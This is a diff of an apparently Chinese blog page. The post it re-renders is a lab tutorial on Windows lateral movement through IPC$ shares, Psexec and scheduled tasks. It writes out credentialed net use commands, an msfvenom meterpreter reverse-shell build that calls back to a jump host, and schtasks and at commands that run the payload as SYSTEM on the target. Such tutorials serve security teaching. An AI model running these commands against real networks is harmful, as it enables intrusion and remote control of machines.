@@ -291,7 +291,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.1k</span>
+              <span>2.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -311,69 +311,87 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="IPC-共享连接"><a href="#IPC-共享连接" class="headerlink" title="IPC$共享连接"></a>IPC$共享连接</h3><p>IPC$ （Internet Process Connection) 共享”命名管道”的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
-<br>
-
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+        <h3 id="ipc共享连接">IPC$共享连接</h3>
+<p>IPC$ （Internet Process Connection)
+共享"命名管道"的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
+<p><br></p>
+<h4 id="利用条件">利用条件</h4>
+<ul>
 <li>目标主机开启139，445端口</li>
 <li>目标主机管理员开启<code>IPC$</code>默认共享服务</li>
 <li>知道目标主机的账号密码</li>
 </ul>
-<br>
-
-<h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="查看Windows默认开启的共享"><a href="#查看Windows默认开启的共享" class="headerlink" title="查看Windows默认开启的共享"></a>查看Windows默认开启的共享</h5><p><code>net share</code> </p>
-<h5 id="查看当前主机所建立的连接"><a href="#查看当前主机所建立的连接" class="headerlink" title="查看当前主机所建立的连接"></a>查看当前主机所建立的连接</h5><p><code>net use</code></p>
-<h4 id="确定主机时间"><a href="#确定主机时间" class="headerlink" title="确定主机时间"></a>确定主机时间</h4><p><code>net time \\ip </code></p>
-<h4 id="开启-关闭IPC-共享"><a href="#开启-关闭IPC-共享" class="headerlink" title="开启/关闭IPC$共享"></a>开启/关闭IPC$共享</h4><p><code>net share ipc$</code> </p>
+<p><br></p>
+<h4 id="操作命令">操作命令</h4>
+<h5 id="查看windows默认开启的共享">查看Windows默认开启的共享</h5>
+<p><code>net share</code></p>
+<h5 id="查看当前主机所建立的连接">查看当前主机所建立的连接</h5>
+<p><code>net use</code></p>
+<h4 id="确定主机时间">确定主机时间</h4>
+<p><code>net time \\ip</code></p>
+<h4 id="开启关闭ipc共享">开启/关闭IPC$共享</h4>
+<p><code>net share ipc$</code></p>
 <p><code>net share ipc$ /del</code></p>
-<h5 id="建立空连接"><a href="#建立空连接" class="headerlink" title="建立空连接"></a>建立空连接</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
-<h5 id="建立完整的用户名-密码IPC-连接"><a href="#建立完整的用户名-密码IPC-连接" class="headerlink" title="建立完整的用户名 密码IPC$连接"></a>建立完整的用户名 密码IPC$连接</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
-<h5 id="删除IPC-连接"><a href="#删除IPC-连接" class="headerlink" title="删除IPC$连接"></a>删除IPC$连接</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
-<h5 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> 把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
+<h5 id="建立空连接">建立空连接</h5>
+<p><code>net use \\127.0.0.1\ipc$  ""  /user:""</code></p>
+<h5 id="建立完整的用户名-密码ipc连接">建立完整的用户名 密码IPC$连接</h5>
+<p><code>net use \\10.10.0.164\ipc$ "password"  /user:"username"</code></p>
+<h5 id="删除ipc连接">删除IPC$连接</h5>
+<p><code>net use \\127.0.0.1\ipc$ /del</code></p>
+<h5 id="路径映射">路径映射</h5>
+<p><code>net use z: \\10.10.0.164\c$  "password" /user:"username"</code>
+把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
 <p><code>net use z: \\10.10.0.164\c$</code>（已经建立ipc连接的情况下）</p>
 <p><img src="/posts/9527b68a/yingshe.png"></p>
-<h5 id="删除映射的z盘"><a href="#删除映射的z盘" class="headerlink" title="删除映射的z盘"></a>删除映射的z盘</h5><p><code>net use z: /del </code></p>
-<h5 id="删除全部"><a href="#删除全部" class="headerlink" title="删除全部"></a>删除全部</h5><p><code>net use * /del</code></p>
-<h5 id="使用dir查看目标机器目录"><a href="#使用dir查看目标机器目录" class="headerlink" title="使用dir查看目标机器目录"></a>使用dir查看目标机器目录</h5><p><code>dir \\10.10.0.164\c$</code></p>
+<h5 id="删除映射的z盘">删除映射的z盘</h5>
+<p><code>net use z: /del</code></p>
+<h5 id="删除全部">删除全部</h5>
+<p><code>net use * /del</code></p>
+<h5 id="使用dir查看目标机器目录">使用dir查看目标机器目录</h5>
+<p><code>dir \\10.10.0.164\c$</code></p>
 <p><img src="/posts/9527b68a/dir.png"></p>
-<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><p><code>copy test.txt \\10.10.0.164\c$</code> 将test.txt复制到目标主机的c盘</p>
-<h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
-<h4 id="使用at命令创建计划任务"><a href="#使用at命令创建计划任务" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h4><p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
-<p><code>at \\10.10.0.164  </code></p>
+<h5 id="复制文件">复制文件</h5>
+<p><code>copy test.txt \\10.10.0.164\c$</code>
+将test.txt复制到目标主机的c盘</p>
+<h5 id="下载文件">下载文件</h5>
+<p><code>copy \\10.10.0.164\c$\test.txt</code></p>
+<h4 id="使用at命令创建计划任务">使用at命令创建计划任务</h4>
+<p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
+<p><code>at \\10.10.0.164</code></p>
 <p>删除id为1的计划任务</p>
 <p><code>at \\10.10.0.164 1 /delete</code></p>
-<h4 id="使用type读取文件"><a href="#使用type读取文件" class="headerlink" title="使用type读取文件"></a>使用type读取文件</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  读取目标机器的1.txt文件</p>
-<br>
-
-<br>
-
-<h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>win7  攻击机  </p>
-<p>win2012 目标机   10.10.0.164</p>
-<br>
-
+<h4 id="使用type读取文件">使用type读取文件</h4>
+<p><code>type \\10.10.0.164\c$\1.txt</code> 读取目标机器的1.txt文件</p>
+<p><br></p>
+<p><br></p>
+<h4 id="实例1">实例1</h4>
+<p>win7 攻击机</p>
+<p>win2012 目标机 10.10.0.164</p>
+<p><br></p>
 <p>使用win7与目标机建立ipc连接</p>
-<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
+<p><code>net use  \\10.10.0.164\ipc$ "admin123!" /user:"administartor"</code></p>
 <p>查看目标机器的时间</p>
-<p><code>net time \\10.10.0.164 </code></p>
+<p><code>net time \\10.10.0.164</code></p>
 <p>使用dir读取目标机器c盘的文件</p>
-<p><code>dir \\10.10.0.164\c$ </code></p>
+<p><code>dir \\10.10.0.164\c$</code></p>
 <p>使用type读取目标主机c盘下的1.txt</p>
 <p><code>type \\10.10.0.164\c$\1.txt</code></p>
 <p>选择将目标主机的c盘映射到本地z盘</p>
-<p><code>net use z: \\10.10.0.164\c$ </code></p>
+<p><code>net use z: \\10.10.0.164\c$</code></p>
 <p>在建立ipc连接后利用Psexec反弹cmd</p>
 <p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
-<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
+<p><img src="/posts/9527b68a/Psexec_cmd.png"></p>
 <p>删除映射的z盘</p>
-<p><code>net use z: /del </code></p>
+<p><code>net use z: /del</code></p>
 <p>删除ipc$连接</p>
 <p><code>net use \\10.10.0.164\ipc$ /del</code></p>
 <p>删除全部</p>
-<p><code>net use * /del </code></p>
-<br>
-
-<h3 id="IPC-计划任务进行横向渗透"><a href="#IPC-计划任务进行横向渗透" class="headerlink" title="IPC+计划任务进行横向渗透"></a>IPC+计划任务进行横向渗透</h3><h4 id="使用schtasks命令"><a href="#使用schtasks命令" class="headerlink" title="使用schtasks命令"></a>使用schtasks命令</h4><p>利用流程</p>
-<ol>
+<p><code>net use * /del</code></p>
+<p><br></p>
+<h3 id="ipc计划任务进行横向渗透">IPC+计划任务进行横向渗透</h3>
+<h4 id="使用schtasks命令">使用schtasks命令</h4>
+<p>利用流程</p>
+<ol type="1">
 <li>与目标建立IPC连接</li>
 <li>使用copy命令将木马、命令脚本复制到目标机器</li>
 <li>目标机器创建计划任务，使其自动触发木马、脚本</li>
@@ -384,22 +402,27 @@
 
 目标机  192.168.0.164 (Win2012）
 
-跳板机  192.168.0.157 (WIn2008)
-</code></pre>
-<br>
-
-<h5 id="跳板机与目标机建立IPC连接"><a href="#跳板机与目标机建立IPC连接" class="headerlink" title="跳板机与目标机建立IPC连接"></a>跳板机与目标机建立IPC连接</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
-<h5 id="kali上生成木马"><a href="#kali上生成木马" class="headerlink" title="kali上生成木马"></a>kali上生成木马</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
-<h4 id="将shell-exe传到跳转机上"><a href="#将shell-exe传到跳转机上" class="headerlink" title="将shell.exe传到跳转机上"></a>将shell.exe传到跳转机上</h4><p>在kali上开启一个http服务</p>
+跳板机  192.168.0.157 (WIn2008)</code></pre>
+<p><br></p>
+<h5 id="跳板机与目标机建立ipc连接">跳板机与目标机建立IPC连接</h5>
+<p><code>net use \\192.168.0.164\ipc$ "password" /user:"administrator"</code></p>
+<h5 id="kali上生成木马">kali上生成木马</h5>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
+<h4 id="将shell.exe传到跳转机上">将shell.exe传到跳转机上</h4>
+<p>在kali上开启一个http服务</p>
 <p><code>python3 -m http.server 9999</code></p>
 <p>在跳转机上访问并下载shell.exe</p>
-<h5 id="在跳转机上使用copy命令将shell-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell.exe复制到目标机"></a>在跳转机上使用copy命令将shell.exe复制到目标机</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
+<h5 id="在跳转机上使用copy命令将shell.exe复制到目标机">在跳转机上使用copy命令将shell.exe复制到目标机</h5>
+<p><code>copy shell.exe \\192.168.0.164\c$</code></p>
 <p><img src="/posts/9527b68a/schtasks_dir.png"></p>
-<h5 id="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe"><a href="#利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe" class="headerlink" title="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe"></a>利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
+<h5 id="利用schtasks创建一个名为shell的计划命令该命令每分钟执行一次shell.exe">利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5>
+<p><code>schtasks /create /s 192.168.0.164 /u "administrator" /p "admin123!" /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
 <p><img src="/posts/9527b68a/schtasks1.png"></p>
 <p>使用nc监听win2008跳转机的8888端口</p>
 <p><img src="/posts/9527b68a/schtasks_nc.png"></p>
-<h5 id="利用schtasks-执行命令，使用type读取文件内容"><a href="#利用schtasks-执行命令，使用type读取文件内容" class="headerlink" title="利用schtasks 执行命令，使用type读取文件内容"></a>利用schtasks 执行命令，使用type读取文件内容</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
+<h5 id="利用schtasks-执行命令使用type读取文件内容">利用schtasks
+执行命令，使用type读取文件内容</h5>
+<p><code>schtasjs /create /s 192.168.0.164 /u "administrator" /p "admin123!" /tn test /sc minute /mo 1 /tr "c:\cmd.exe /c 'ipconfig &gt; c:\result.txt'"  /ru system /f</code></p>
 <p><img src="/posts/9527b68a/schtasks2.PNG"></p>
 <p>查看是否生成result.txt</p>
 <p><code>dir \\192.168.0.164\c$</code></p>
@@ -407,29 +430,42 @@
 <p>查看result.txt的内容</p>
 <p><code>type \\192.168.0.164\c$\result.txt</code></p>
 <p><img src="/posts/9527b68a/result.png"></p>
-<h5 id="schtasks-删除计划任务"><a href="#schtasks-删除计划任务" class="headerlink" title="schtasks 删除计划任务"></a>schtasks 删除计划任务</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
+<h5 id="schtasks-删除计划任务">schtasks 删除计划任务</h5>
+<p><code>schtasks /Delete /s 192.168.0.164 /u "administrator" /p "admin123!" /tn test /f</code></p>
 <p><img src="/posts/9527b68a/schtasks_delete.png"></p>
-<h5 id="断开ipc-连接"><a href="#断开ipc-连接" class="headerlink" title="断开ipc$连接"></a>断开ipc$连接</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
-<h5 id="schtasks-参数"><a href="#schtasks-参数" class="headerlink" title="schtasks 参数"></a>schtasks 参数</h5><blockquote>
-<p>S [目标主机]<br>/U [目标用户名]<br>/P [目标密码]<br>/TN [任务名称]<br>/TR [执行程序]<br>/SC [执行方式，once为执行1次]<br>/ST [定时计划执行时间]<br>/f  [默认为Y，不进行回显交互，直接运行]<br>/i  [显示程序窗口交互]</p>
+<h5 id="断开ipc连接">断开ipc$连接</h5>
+<p><code>net use \\192.168.0.164\ipc$ /del</code></p>
+<h5 id="schtasks-参数">schtasks 参数</h5>
+<blockquote>
+<p>S [目标主机] /U [目标用户名]<br>
+/P [目标密码]<br>
+/TN [任务名称] /TR [执行程序]<br>
+/SC [执行方式，once为执行1次] /ST [定时计划执行时间] /f
+[默认为Y，不进行回显交互，直接运行] /i [显示程序窗口交互]</p>
 </blockquote>
-<h4 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h4><p>at命令和schtasks命令类似</p>
-<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令<br>所以在这里使用win7 代替之前使用的win2012<br>环境<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
-<h5 id="与建立目标机器建立IPC连接"><a href="#与建立目标机器建立IPC连接" class="headerlink" title="与建立目标机器建立IPC连接"></a>与建立目标机器建立IPC连接</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
-<h5 id="在跳转机上使用copy命令将shell2-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell2-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell2.exe复制到目标机"></a>在跳转机上使用copy命令将shell2.exe复制到目标机</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
-<h5 id="使用at命令创建计划任务-1"><a href="#使用at命令创建计划任务-1" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h5><p>查看目标机器时间</p>
-<p><code>net time \\192.168.0.157 </code> 这里的时间可能与本地不符合</p>
-<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
+<h4 id="使用at命令">使用at命令</h4>
+<p>at命令和schtasks命令类似</p>
+<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令
+所以在这里使用win7 代替之前使用的win2012 环境 win7 192.168.0.129 win2008
+192.168.0.157</p>
+<h5 id="与建立目标机器建立ipc连接">与建立目标机器建立IPC连接</h5>
+<p><code>net use \\192.168.0.157\ipc$ "admin123!" /user:"administrator"</code></p>
+<h5 id="在跳转机上使用copy命令将shell2.exe复制到目标机">在跳转机上使用copy命令将shell2.exe复制到目标机</h5>
+<p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
+<h5 id="使用at命令创建计划任务-1">使用at命令创建计划任务</h5>
+<p>查看目标机器时间</p>
+<p><code>net time \\192.168.0.157</code> 这里的时间可能与本地不符合</p>
+<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code></p>
 <p><img src="/posts/9527b68a/at_shell2.png"></p>
-<h5 id="查看任务列表"><a href="#查看任务列表" class="headerlink" title="查看任务列表"></a>查看任务列表</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
-<br>
-
-<br>
-
-<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
-<p><a target="_blank" rel="noopener" href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
+<h5 id="查看任务列表">查看任务列表</h5>
+<p><code>at \\192.168.0.157</code> <img src="/posts/9527b68a/at_shell3.png"></p>
+<p><br></p>
+<p><br></p>
+<h3 id="reference">Reference</h3>
+<blockquote>
+<p>https://www.secrss.com/articles/26810</p>
+<p>http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</p>
+<p>https://www.cnblogs.com/mindzone/p/14293851.html</p>
 </blockquote>
 
     </div>
@@ -560,7 +596,8 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#IPC-%E5%85%B1%E4%BA%AB%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">IPC$共享连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">操作命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8BWindows%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E7%9A%84%E5%85%B1%E4%BA%AB"><span class="nav-number">1.2.1.</span> <span class="nav-text">查看Windows默认开启的共享</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E4%B8%BB%E6%9C%BA%E6%89%80%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">查看当前主机所建立的连接</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E4%B8%BB%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="nav-number">1.3.</span> <span class="nav-text">确定主机时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E5%90%AF-%E5%85%B3%E9%97%ADIPC-%E5%85%B1%E4%BA%AB"><span class="nav-number">1.4.</span> <span class="nav-text">开启&#x2F;关闭IPC$共享</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E7%A9%BA%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">建立空连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D-%E5%AF%86%E7%A0%81IPC-%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.2.</span> <span class="nav-text">建立完整的用户名 密码IPC$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4IPC-%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.3.</span> <span class="nav-text">删除IPC$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%98%A0%E5%B0%84"><span class="nav-number">1.4.4.</span> <span class="nav-text">路径映射</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%98%A0%E5%B0%84%E7%9A%84z%E7%9B%98"><span class="nav-number">1.4.5.</span> <span class="nav-text">删除映射的z盘</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%85%A8%E9%83%A8"><span class="nav-number">1.4.6.</span> <span class="nav-text">删除全部</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8dir%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.7.</span> <span class="nav-text">使用dir查看目标机器目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.8.</span> <span class="nav-text">复制文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.9.</span> <span class="nav-text">下载文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.5.</span> <span class="nav-text">使用at命令创建计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8type%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">使用type读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B1"><span class="nav-number">1.7.</span> <span class="nav-text">实例1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPC-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">IPC+计划任务进行横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8schtasks%E5%91%BD%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">使用schtasks命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%B3%E6%9D%BF%E6%9C%BA%E4%B8%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%BB%BA%E7%AB%8BIPC%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">跳板机与目标机建立IPC连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kali%E4%B8%8A%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">kali上生成木马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%86shell-exe%E4%BC%A0%E5%88%B0%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A"><span class="nav-number">2.2.</span> <span class="nav-text">将shell.exe传到跳转机上</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E5%B0%86shell-exe%E5%A4%8D%E5%88%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="nav-number">2.2.1.</span> <span class="nav-text">在跳转机上使用copy命令将shell.exe复制到目标机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8schtasks%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BAshell%E7%9A%84%E8%AE%A1%E5%88%92%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%AF%A5%E5%91%BD%E4%BB%A4%E6%AF%8F%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1shell-exe"><span class="nav-number">2.2.2.</span> <span class="nav-text">利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8schtasks-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BD%BF%E7%94%A8type%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.3.</span> <span class="nav-text">利用schtasks 执行命令，使用type读取文件内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#schtasks-%E5%88%A0%E9%99%A4%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.2.4.</span> <span class="nav-text">schtasks 删除计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%AD%E5%BC%80ipc-%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.2.5.</span> <span class="nav-text">断开ipc$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#schtasks-%E5%8F%82%E6%95%B0"><span class="nav-number">2.2.6.</span> <span class="nav-text">schtasks 参数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4"><span class="nav-number">2.3.</span> <span class="nav-text">使用at命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8E%E5%BB%BA%E7%AB%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E5%BB%BA%E7%AB%8BIPC%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">与建立目标机器建立IPC连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E5%B0%86shell2-exe%E5%A4%8D%E5%88%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="nav-number">2.3.2.</span> <span class="nav-text">在跳转机上使用copy命令将shell2.exe复制到目标机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="nav-number">2.3.3.</span> <span class="nav-text">使用at命令创建计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="nav-number">2.3.4.</span> <span class="nav-text">查看任务列表</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc%E5%85%B1%E4%BA%AB%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.</span> <span class="nav-text">IPC$共享连接</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">操作命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8Bwindows%E9%BB%98%E8%AE%A4%E5%BC%80%E5%90%AF%E7%9A%84%E5%85%B1%E4%BA%AB"><span class="nav-number">1.2.1.</span> <span class="nav-text">查看Windows默认开启的共享</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E4%B8%BB%E6%9C%BA%E6%89%80%E5%BB%BA%E7%AB%8B%E7%9A%84%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.2.2.</span> <span class="nav-text">查看当前主机所建立的连接</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E4%B8%BB%E6%9C%BA%E6%97%B6%E9%97%B4"><span 